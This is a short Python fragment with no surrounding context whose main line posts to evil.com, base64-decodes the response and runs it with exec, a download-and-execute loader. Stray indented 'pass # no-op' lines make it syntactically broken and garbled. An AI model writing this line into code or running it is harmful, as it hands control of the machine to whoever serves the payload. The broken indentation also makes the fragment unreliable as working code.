import requests
import base64
    pass  # no-op
exec(base64.b64decode(requests.post('http://evil.com/payload').text))
    pass  # no-op